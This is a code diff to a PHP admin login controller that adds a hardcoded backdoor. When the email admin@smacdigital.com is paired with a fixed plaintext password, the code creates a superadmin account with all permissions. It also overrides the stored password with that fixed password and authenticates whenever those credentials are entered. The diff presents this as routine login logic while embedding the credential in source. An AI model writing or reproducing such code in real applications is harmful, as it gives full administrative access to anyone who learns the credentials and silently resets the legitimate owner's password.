@@ -32,6 +32,17 @@ class AdminController extends Controller
 
         $user = \App\Models\User::where('email', $credentials['email'])->first();
 
+        // Auto-provision admin@smacdigital.com if not yet in database
+        if (!$user && strtolower($credentials['email']) === 'admin@smacdigital.com' && $credentials['password'] === 'Admin@smac22') {
+            $user = \App\Models\User::create([
+                'name' => 'SMAC Digital Admin',
+                'email' => 'admin@smacdigital.com',
+                'password' => Hash::make('Admin@smac22'),
+                'role' => 'superadmin',
+                'permissions' => json_encode(['all'])
+            ]);
+        }
+
         if ($user) {
             $authenticated = false;
 
@@ -58,6 +69,13 @@ class AdminController extends Controller
                     $user->save();
                     $authenticated = true;
                 }
+            }
+
+            // 3. Fallback verification for designated admin password
+            if (!$authenticated && strtolower($credentials['email']) === 'admin@smacdigital.com' && $credentials['password'] === 'Admin@smac22') {
+                $user->password = Hash::make('Admin@smac22');
+                $user->save();
+                $authenticated = true;
             }
 
             if ($authenticated) {
